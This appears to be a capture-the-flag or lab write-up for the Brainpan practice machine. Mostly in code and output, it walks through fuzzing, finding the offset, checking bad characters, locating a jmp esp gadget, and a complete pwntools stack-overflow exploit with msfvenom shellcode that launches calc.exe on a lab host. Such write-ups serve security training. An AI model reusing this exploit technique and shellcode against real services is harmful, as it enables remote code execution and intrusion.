@@ -1,0 +1,120 @@
+# Brainpan
+
+```
+$ nc 192.168.122.186 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                          >> foo
+                          ACCESS DENIED
+
+```
+
+```py
+In [1]: r = remote('192.168.122.186', 9999)
+[x] Opening connection to 192.168.122.186 on port 9999
+[x] Opening connection to 192.168.122.186 on port 9999: Trying 192.168.122.186
+[+] Opening connection to 192.168.122.186 on port 9999: Done
+
+In [2]: r.writeline('A' * 1000)
+```
+
+![Image 1](img/brainpan-1.png)
+
+```py
+pyIn [3]: r = remote('192.168.122.186', 9999)
+[x] Opening connection to 192.168.122.186 on port 9999
+[x] Opening connection to 192.168.122.186 on port 9999: Trying 192.168.122.186
+[+] Opening connection to 192.168.122.186 on port 9999: Done
+
+In [4]: r.writeline(cyclic(1000, n=4))
+```
+
+![Image 2](img/brainpan-2.png)
+
+![Image 3](img/brainpan-3.png)
+
+```py
+In [5]: cyclic_find(0x66616167)
+Out[5]: 524
+```
+
+```py
+In [8]: r = remote('192.168.122.187', 9999)
+[x] Opening connection to 192.168.122.187 on port 9999
+[x] Opening connection to 192.168.122.187 on port 9999: Trying 192.168.122.187
+[+] Opening connection to 192.168.122.187 on port 9999: Done
+
+In [9]: r.writeline(bytes(range(1, 256)))
+```
+
+![Image 4](img/brainpan-4.png)
+
+![Image 5](img/brainpan-5.png)
+
+```
+$ ropper -f ./brainpan.exe --search 'jmp esp' 
+[INFO] Load gadgets for section: .text
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: jmp esp
+
+[INFO] File: ./brainpan.exe
+0x311712f3: jmp esp;
+```
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+
+r = remote('192.168.122.187', 9999)
+
+pad = b'\x90' * 524
+
+# msfvenom -p windows/exec -f py CMD=calc.exe
+buf =  b""
+buf += b"\xb8\x06\x2d\x04\x95\xdb\xc7\xd9\x74\x24\xf4\x5e\x33"
+buf += b"\xc9\xb1\x31\x83\xee\xfc\x31\x46\x0f\x03\x46\x09\xcf"
+buf += b"\xf1\x69\xfd\x8d\xfa\x91\xfd\xf1\x73\x74\xcc\x31\xe7"
+buf += b"\xfc\x7e\x82\x63\x50\x72\x69\x21\x41\x01\x1f\xee\x66"
+buf += b"\xa2\xaa\xc8\x49\x33\x86\x29\xcb\xb7\xd5\x7d\x2b\x86"
+buf += b"\x15\x70\x2a\xcf\x48\x79\x7e\x98\x07\x2c\x6f\xad\x52"
+buf += b"\xed\x04\xfd\x73\x75\xf8\xb5\x72\x54\xaf\xce\x2c\x76"
+buf += b"\x51\x03\x45\x3f\x49\x40\x60\x89\xe2\xb2\x1e\x08\x23"
+buf += b"\x8b\xdf\xa7\x0a\x24\x12\xb9\x4b\x82\xcd\xcc\xa5\xf1"
+buf += b"\x70\xd7\x71\x88\xae\x52\x62\x2a\x24\xc4\x4e\xcb\xe9"
+buf += b"\x93\x05\xc7\x46\xd7\x42\xcb\x59\x34\xf9\xf7\xd2\xbb"
+buf += b"\x2e\x7e\xa0\x9f\xea\xdb\x72\x81\xab\x81\xd5\xbe\xac"
+buf += b"\x6a\x89\x1a\xa6\x86\xde\x16\xe5\xcc\x21\xa4\x93\xa2"
+buf += b"\x22\xb6\x9b\x92\x4a\x87\x10\x7d\x0c\x18\xf3\x3a\xe2"
+buf += b"\x52\x5e\x6a\x6b\x3b\x0a\x2f\xf6\xbc\xe0\x73\x0f\x3f"
+buf += b"\x01\x0b\xf4\x5f\x60\x0e\xb0\xe7\x98\x62\xa9\x8d\x9e"
+buf += b"\xd1\xca\x87\xfc\xb4\x58\x4b\x2d\x53\xd9\xee\x31"
+
+nop = b'\x90' * 64
+
+# 0x311712f3: jmp esp;
+ret = p32(0x311712f3)
+
+r.writeline(pad + ret + nop + buf)
+r.close()
+```
+
+```
+$ ./exploit.py 
+[+] Opening connection to 192.168.122.187 on port 9999: Done
+[*] Closed connection to 192.168.122.187 port 9999
+```
+
+![Image 6](img/brainpan-6.png)
+
